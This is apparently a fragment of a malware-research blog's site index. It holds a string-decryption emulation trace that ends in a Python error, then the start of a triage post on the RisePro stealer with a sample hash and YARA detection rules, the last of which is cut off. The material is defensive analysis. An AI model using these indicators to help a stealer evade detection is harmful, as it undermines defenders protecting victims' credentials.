0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9434 for stack size 0x102e4 saving data to stack: 896093928 4 0x461c28: mov dword ptr [esp + 0x1438], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9438 for stack size 0x102e8 saving data to stack: 929680980 4 0x461c33: mov dword ptr [esp + 0x143c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x943c for stack size 0x102ec saving data to stack: 1389027477 4 0x461c3e: mov dword ptr [esp + 0x1440], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9440 for stack size 0x102f0 saving data to stack: 914789047 4 0x461c49: mov dword ptr [esp + 0x1444], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9444 for stack size 0x102f4 saving data to stack: 896093928 4 0x461c54: mov dword ptr [esp + 0x1448], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9448 for stack size 0x102f8 saving data to stack: 929680980 4 0x461c5f: mov dword ptr [esp + 0x144c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x944c for stack size 0x102fc saving data to stack: 1389027477 4 0x461c6a: mov dword ptr [esp + 0x1450], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9450 for stack size 0x10300 saving data to stack: 914789047 4 0x461c75: mov dword ptr [esp + 0x1454], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9454 for stack size 0x10304 saving data to stack: 896093928 4 0x461c80: mov dword ptr [esp + 0x1458], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9458 for stack size 0x10308 saving data to stack: 929680980 4 0x461c8b: mov dword ptr [esp + 0x145c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x945c for stack size 0x1030c saving data to stack: 1389027477 4 0x461c96: mov dword ptr [esp + 0x1640], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9640 for stack size 0x10310 saving data to stack: 914789047 4 0x461ca1: mov dword ptr [esp + 0x1644], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9644 for stack size 0x10314 saving data to stack: 896093928 4 0x461cac: mov dword ptr [esp + 0x1648], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9648 for stack size 0x10318 saving data to stack: 929680980 4 0x461cb7: mov dword ptr [esp + 0x164c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x964c for stack size 0x1031c saving data to stack: 1389027477 4 0x461cc2: mov dword ptr [esp + 0x1460], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9460 for stack size 0x10320 saving data to stack: 914789047 4 0x461ccd: mov dword ptr [esp + 0x1464], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9464 for stack size 0x10324 saving data to stack: 896093928 4 0x461cd8: mov dword ptr [esp + 0x1468], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9468 for stack size 0x10328 saving data to stack: 929680980 4 0x461ce3: mov dword ptr [esp + 0x146c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x946c for stack size 0x1032c saving data to stack: 1389027477 4 0x461cee: mov dword ptr [esp + 0x1470], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9470 for stack size 0x10330 saving data to stack: 914789047 4 0x461cf9: mov dword ptr [esp + 0x1474], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9474 for stack size 0x10334 saving data to stack: 896093928 4 0x461d04: mov dword ptr [esp + 0x1478], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9478 for stack size 0x10338 saving data to stack: 929680980 4 0x461d0f: mov dword ptr [esp + 0x147c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x947c for stack size 0x1033c saving data to stack: 1389027477 4 0x461d1a: mov dword ptr [esp + 0x1480], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9480 for stack size 0x10340 saving data to stack: 914789047 4 0x461d25: mov dword ptr [esp + 0x1484], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9484 for stack size 0x10344 saving data to stack: 896093928 4 0x461d30: mov dword ptr [esp + 0x1488], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9488 for stack size 0x10348 saving data to stack: 929680980 4 0x461d3b: mov dword ptr [esp + 0x148c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x948c for stack size 0x1034c saving data to stack: 1389027477 4 0x461d46: mov dword ptr [esp + 0x1490], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9490 for stack size 0x10350 saving data to stack: 914789047 4 0x461d51: mov dword ptr [esp + 0x1494], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9494 for stack size 0x10354 saving data to stack: 896093928 4 0x461d5c: mov dword ptr [esp + 0x1498], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9498 for stack size 0x10358 saving data to stack: 929680980 4 0x461d67: mov dword ptr [esp + 0x149c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x949c for stack size 0x1035c saving data to stack: 1389027477 4 0x461d72: mov dword ptr [esp + 0x1580], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9580 for stack size 0x10360 saving data to stack: 914789047 4 0x461d7d: mov dword ptr [esp + 0x1584], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9584 for stack size 0x10364 saving data to stack: 896093928 4 0x461d88: mov dword ptr [esp + 0x1588], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9588 for stack size 0x10368 saving data to stack: 929680980 4 0x461d93: mov dword ptr [esp + 0x158c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x958c for stack size 0x1036c saving data to stack: 1389027477 4 0x461d9e: mov dword ptr [esp + 0x1590], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9590 for stack size 0x10370 saving data to stack: 1913178889 4 0x461da9: mov dword ptr [esp + 0x1594], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9594 for stack size 0x10374 saving data to stack: 2231344414 4 0x461db0: mov dword ptr [esp + 0x1598], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9598 for stack size 0x10378 saving data to stack: 586689126 4 0x461db7: mov dword ptr [esp + 0x159c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x959c for stack size 0x1037c saving data to stack: 1701587195 4 0x461dbe: mov dword ptr [esp + 0x14a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94a0 for stack size 0x10380 saving data to stack: 914789047 4 0x461dc9: mov dword ptr [esp + 0x14a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94a4 for stack size 0x10384 saving data to stack: 896093928 4 0x461dd4: mov dword ptr [esp + 0x14a8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94a8 for stack size 0x10388 saving data to stack: 929680980 4 0x461ddf: mov dword ptr [esp + 0x14ac], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94ac for stack size 0x1038c saving data to stack: 1389027477 4 0x461dea: mov dword ptr [esp + 0x14b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94b0 for stack size 0x10390 saving data to stack: 914789047 4 0x461df5: mov dword ptr [esp + 0x14b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94b4 for stack size 0x10394 saving data to stack: 896093928 4 0x461e00: mov dword ptr [esp + 0x14b8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94b8 for stack size 0x10398 saving data to stack: 929680980 4 0x461e0b: mov dword ptr [esp + 0x14bc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94bc for stack size 0x1039c saving data to stack: 1389027477 4 0x461e16: mov dword ptr [esp + 0x14c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94c0 for stack size 0x103a0 saving data to stack: 914789047 4 0x461e21: mov dword ptr [esp + 0x14c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94c4 for stack size 0x103a4 saving data to stack: 896093928 4 0x461e2c: mov dword ptr [esp + 0x14c8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94c8 for stack size 0x103a8 saving data to stack: 929680980 4 0x461e37: mov dword ptr [esp + 0x14cc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94cc for stack size 0x103ac saving data to stack: 1389027477 4 0x461e42: mov dword ptr [esp + 0x14d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94d0 for stack size 0x103b0 saving data to stack: 914789047 4 0x461e4d: mov dword ptr [esp + 0x15b8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95b8 for stack size 0x103b4 saving data to stack: 586689126 4 0x461e54: mov dword ptr [esp + 0x15d8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95d8 for stack size 0x103b8 saving data to stack: 586689126 4 0x461e5b: mov dword ptr [esp + 0x15f8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95f8 for stack size 0x103bc saving data to stack: 586689126 4 0x461e62: mov dword ptr [esp + 0x1618], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9618 for stack size 0x103c0 saving data to stack: 586689126 4 0x461e69: mov dword ptr [esp + 0x1638], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9638 for stack size 0x103c4 saving data to stack: 586689126 4 0x461e70: mov dword ptr [esp + 0x1398], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9398 for stack size 0x103c8 saving data to stack: 586689126 4 0x461e77: mov dword ptr [esp + 0x1668], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9668 for stack size 0x103cc saving data to stack: 586689126 4 0x461e7e: mov ecx, edi, regs_read: [23], regs_write: [22] 0x461e80: mov dword ptr [esp + 0x14d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94d4 for stack size 0x103d0 saving data to stack: 896093928 4 0x461e8b: mov dword ptr [esp + 0x14d8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94d8 for stack size 0x103d4 saving data to stack: 929680980 4 0x461e96: mov dword ptr [esp + 0x14dc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94dc for stack size 0x103d8 saving data to stack: 1389027477 4 0x461ea1: mov dword ptr [esp + 0x14e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94e0 for stack size 0x103dc saving data to stack: 914789047 4 0x461eac: mov dword ptr [esp + 0x14e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94e4 for stack size 0x103e0 saving data to stack: 896093928 4 0x461eb7: mov dword ptr [esp + 0x14e8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94e8 for stack size 0x103e4 saving data to stack: 929680980 4 0x461ec2: mov dword ptr [esp + 0x14ec], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94ec for stack size 0x103e8 saving data to stack: 1389027477 4 0x461ecd: mov dword ptr [esp + 0x15a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95a0 for stack size 0x103ec saving data to stack: 914789047 4 0x461ed8: mov dword ptr [esp + 0x15a4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95a4 for stack size 0x103f0 saving data to stack: 896093928 4 0x461ee3: mov dword ptr [esp + 0x15a8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95a8 for stack size 0x103f4 saving data to stack: 929680980 4 0x461eee: mov dword ptr [esp + 0x15ac], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95ac for stack size 0x103f8 saving data to stack: 1389027477 4 0x461ef9: mov dword ptr [esp + 0x15b0], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95b0 for stack size 0x103fc saving data to stack: 1913178889 4 0x461f04: mov dword ptr [esp + 0x15b4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95b4 for stack size 0x10400 saving data to stack: 2231344414 4 0x461f0b: mov dword ptr [esp + 0x15bc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95bc for stack size 0x10404 saving data to stack: 1701587195 4 0x461f12: mov dword ptr [esp + 0x15c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95c0 for stack size 0x10408 saving data to stack: 914789047 4 0x461f1d: mov dword ptr [esp + 0x15c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95c4 for stack size 0x1040c saving data to stack: 896093928 4 0x461f28: mov dword ptr [esp + 0x15c8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95c8 for stack size 0x10410 saving data to stack: 929680980 4 0x461f33: mov dword ptr [esp + 0x15cc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95cc for stack size 0x10414 saving data to stack: 1389027477 4 0x461f3e: mov dword ptr [esp + 0x15d0], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95d0 for stack size 0x10418 saving data to stack: 1913178889 4 0x461f49: mov dword ptr [esp + 0x15d4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95d4 for stack size 0x1041c saving data to stack: 2231344414 4 0x461f50: mov dword ptr [esp + 0x15dc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95dc for stack size 0x10420 saving data to stack: 1701587195 4 0x461f57: mov dword ptr [esp + 0x14f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94f0 for stack size 0x10424 saving data to stack: 914789047 4 0x461f62: mov dword ptr [esp + 0x14f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94f4 for stack size 0x10428 saving data to stack: 896093928 4 0x461f6d: mov dword ptr [esp + 0x14f8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94f8 for stack size 0x1042c saving data to stack: 929680980 4 0x461f78: mov dword ptr [esp + 0x14fc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x94fc for stack size 0x10430 saving data to stack: 1389027477 4 0x461f83: mov dword ptr [esp + 0x15e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95e0 for stack size 0x10434 saving data to stack: 914789047 4 0x461f8e: mov dword ptr [esp + 0x15e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95e4 for stack size 0x10438 saving data to stack: 896093928 4 0x461f99: mov dword ptr [esp + 0x15e8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95e8 for stack size 0x1043c saving data to stack: 929680980 4 0x461fa4: mov dword ptr [esp + 0x15ec], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95ec for stack size 0x10440 saving data to stack: 1389027477 4 0x461faf: mov dword ptr [esp + 0x15f0], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95f0 for stack size 0x10444 saving data to stack: 1913178889 4 0x461fba: mov dword ptr [esp + 0x15f4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95f4 for stack size 0x10448 saving data to stack: 2231344414 4 0x461fc1: mov dword ptr [esp + 0x15fc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x95fc for stack size 0x1044c saving data to stack: 1701587195 4 0x461fc8: mov dword ptr [esp + 0x1500], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9500 for stack size 0x10450 saving data to stack: 914789047 4 0x461fd3: mov dword ptr [esp + 0x1504], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9504 for stack size 0x10454 saving data to stack: 896093928 4 0x461fde: mov dword ptr [esp + 0x1508], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9508 for stack size 0x10458 saving data to stack: 929680980 4 0x461fe9: mov dword ptr [esp + 0x150c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x950c for stack size 0x1045c saving data to stack: 1389027477 4 0x461ff4: mov dword ptr [esp + 0x1600], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9600 for stack size 0x10460 saving data to stack: 914789047 4 0x461fff: mov dword ptr [esp + 0x1604], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9604 for stack size 0x10464 saving data to stack: 896093928 4 0x46200a: mov dword ptr [esp + 0x1608], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9608 for stack size 0x10468 saving data to stack: 929680980 4 0x462015: mov dword ptr [esp + 0x160c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x960c for stack size 0x1046c saving data to stack: 1389027477 4 0x462020: mov dword ptr [esp + 0x1610], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9610 for stack size 0x10470 saving data to stack: 1913178889 4 0x46202b: mov dword ptr [esp + 0x1614], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9614 for stack size 0x10474 saving data to stack: 2231344414 4 0x462032: mov dword ptr [esp + 0x161c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x961c for stack size 0x10478 saving data to stack: 1701587195 4 0x462039: mov dword ptr [esp + 0x1510], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9510 for stack size 0x1047c saving data to stack: 914789047 4 0x462044: mov dword ptr [esp + 0x1514], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9514 for stack size 0x10480 saving data to stack: 896093928 4 0x46204f: mov dword ptr [esp + 0x1518], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9518 for stack size 0x10484 saving data to stack: 929680980 4 0x46205a: mov dword ptr [esp + 0x151c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x951c for stack size 0x10488 saving data to stack: 1389027477 4 0x462065: mov dword ptr [esp + 0x1620], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9620 for stack size 0x1048c saving data to stack: 914789047 4 0x462070: mov dword ptr [esp + 0x1624], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9624 for stack size 0x10490 saving data to stack: 896093928 4 0x46207b: mov dword ptr [esp + 0x1628], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9628 for stack size 0x10494 saving data to stack: 929680980 4 0x462086: mov dword ptr [esp + 0x162c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x962c for stack size 0x10498 saving data to stack: 1389027477 4 0x462091: mov dword ptr [esp + 0x1630], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9630 for stack size 0x1049c saving data to stack: 1913178889 4 0x46209c: mov dword ptr [esp + 0x1634], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9634 for stack size 0x104a0 saving data to stack: 2231344414 4 0x4620a3: mov dword ptr [esp + 0x163c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x963c for stack size 0x104a4 saving data to stack: 1701587195 4 0x4620aa: mov dword ptr [esp + 0x1380], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9380 for stack size 0x104a8 saving data to stack: 914789047 4 0x4620b5: mov dword ptr [esp + 0x1384], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9384 for stack size 0x104ac saving data to stack: 896093928 4 0x4620c0: mov dword ptr [esp + 0x1388], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9388 for stack size 0x104b0 saving data to stack: 929680980 4 0x4620cb: mov dword ptr [esp + 0x138c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x938c for stack size 0x104b4 saving data to stack: 1389027477 4 0x4620d6: mov dword ptr [esp + 0x1390], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9390 for stack size 0x104b8 saving data to stack: 1913178889 4 0x4620e1: mov dword ptr [esp + 0x1394], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9394 for stack size 0x104bc saving data to stack: 2231344414 4 0x4620e8: mov dword ptr [esp + 0x139c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x939c for stack size 0x104c0 saving data to stack: 1701587195 4 0x4620ef: mov dword ptr [esp + 0x1650], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9650 for stack size 0x104c4 saving data to stack: 914789047 4 0x4620fa: mov dword ptr [esp + 0x1654], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9654 for stack size 0x104c8 saving data to stack: 896093928 4 0x462105: mov dword ptr [esp + 0x1658], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9658 for stack size 0x104cc saving data to stack: 929680980 4 0x462110: mov dword ptr [esp + 0x165c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x965c for stack size 0x104d0 saving data to stack: 1389027477 4 0x46211b: mov dword ptr [esp + 0x1660], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9660 for stack size 0x104d4 saving data to stack: 1913178889 4 0x462126: mov dword ptr [esp + 0x1664], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9664 for stack size 0x104d8 saving data to stack: 2231344414 4 0x46212d: mov dword ptr [esp + 0x166c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x966c for stack size 0x104dc saving data to stack: 1701587195 4 0x462134: mov dword ptr [esp + 0x18], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x8018 for stack size 0x104e0 saving data to stack: 586689126 4 0x462138: mov al, byte ptr [ecx + esi], regs_read: [22, 29], regs_write: [2] 0x46213e: mov byte ptr [esp + 0x2f], al, regs_read: [30, 2], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x802f for stack size 0x104e4 saving data to stack: 1 1 . IndexError Traceback (most recent call last) &lt;ipython-input-53-fa015c04b555&gt; in &lt;module&gt; 62 continue 63 # extend the strings list with the strings found in this chunk &gt; 64 strings.extend(emulate_chunk(chunk, env)) 65 env.clear() 66 &lt;ipython-input-52-26017edee58f&gt; in emulate_chunk(chunk, env) 154 if len(regs_read) == 2 and inst.operands[1].type == X86_OP_REG and (regs_read[0] == X86_REG_ESP or regs_read[0] == X86_REG_EBP): 155 #print(f&#39;0x{inst.address:x}: write {hex(env.reg[regs_read[1]])} to stack at {hex(inst.disp)}&#39;) --&gt; 156 env.save_stack(inst.disp, env.reg[regs_read[1]], inst.operands[1].size) 157 158 # if first op is register and second op is stack pointer &lt;ipython-input-52-26017edee58f&gt; in save_stack(self, offset, data, size) 50 51 if size == 1: &gt; 52 self.stack[offset] = data 53 elif size == 2: 54 self.stack[offset:offset+2] = struct.pack(&#39;&lt;h&#39;, data) IndexError: bytearray index out of range .",
            "url": "https://research.openanalysis.net/xorstr/decryption/python/2023/06/25/xorstr.html",
            "relUrl": "/xorstr/decryption/python/2023/06/25/xorstr.html",
            "date": " ‚Ä¢ Jun 25, 2023"
        }
        
    
  
    
        ,"post3": {
            "title": "RisePro Triage",
            "content": "Overview . According to FlashPoint . ‚ÄúRisePro‚Äù is a newly identified stealer written in C++ that appears to possess similar functionality to the stealer malware ‚ÄúVidar.‚Äù RisePro targets potentially sensitive information on infected machines and attempts to exfiltrate it in the form of logs. ‚ÄúRisePro‚Äù is a newly identified stealer written in C++ that appears to possess similar functionality to the stealer malware ‚ÄúVidar.‚Äù RisePro targets potentially sensitive information on infected machines and attempts to exfiltrate it in the form of logs. . RisePRO triggered a false positive for the Malpedia PrivateLoader yara rule and triggered the UnpacMe PrivateLoader config extractor. This led to correct string extraction from RisePRO even thought it is a separate malware. Are these related?! . References . ‚ÄúRisePro‚Äù Stealer and Pay-Per-Install Malware ‚ÄúPrivateLoader‚Äù | PrivateLoader Triage - Config Extractor for PrivateLoader | privateloader_str_decrypt.py | Malpedia yara | PrivateLoader: the loader of the prevalent ruzki PPI service | Example string encryption using xorstr | . Sample . 2cd2f077ca597ad0ef234a357ea71558d5e039da9df9958d0b8bd0efa92e74c9UnpacMe | . Analysis . Both PrivateLoader and RisePRO use the same plaintext user agent string Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 and request header &quot;Content-Type: application/x-www-form-urlencoded&quot; also the string encryption algorithm is the same (xmm registers and xor intrinsic). Funny enough this causes a 100% overlap between the PrivateLoader Yara rule and RisePro. . Sample Identification . PrivateLoader yara rule matches on both PrivateLoader and RisePRO! . rule win_privateloader_w0 { meta: author = &quot;andretavare5&quot; org = &quot;BitSight&quot; date = &quot;2022-06-06&quot; md5 = &quot;8f70a0f45532261cb4df2800b141551d&quot; reference = &quot;https://tavares.re/blog/2022/06/06/hunting-privateloader-pay-per-install-service&quot; license = &quot;CC BY-NC-SA 4.0&quot; malpedia_reference = &quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.privateloader&quot; malpedia_version = &quot;20220824&quot; malpedia_license = &quot;CC BY-NC-SA 4.0&quot; malpedia_sharing = &quot;TLP:WHITE&quot; strings: $code = { 66 0F EF (4?|8?) } // pxor xmm(1/0) - str chunk decryption $str = &quot;Content-Type: application/x-www-form-urlencoded&quot; wide ascii $ua1 = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot; wide ascii $ua2 = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36&quot; wide ascii condition: uint16(0) == 0x5A4D and // MZ $str and any of ($ua*) and #code &gt; 100 } . RisePro Yara Rule . We need new Yara rules for both PrivateLoader and RisePRO to differentiate the two. . The following rule was created by @c3rb3ru5d3d53c. She was using binlex and the rule is has decent fidelity for RisePro. . rule risepro { meta: author = &quot;c3rb3ru5d3d53c&quot; description = &quot;Detects RisePro&quot; hash = &quot;2cd2f077ca597ad0ef234a357ea71558d5e039da9df9958d0b8bd0efa92e74c9&quot; created = &quot;2023-06-18&quot; os = &quot;windows&quot; tlp = &quot;white&quot; rev = 1 strings: $trait_0 = { 8b ff 55 8b ec 83 ec 28 8d 4d ?? 56 57 6a 00 e8 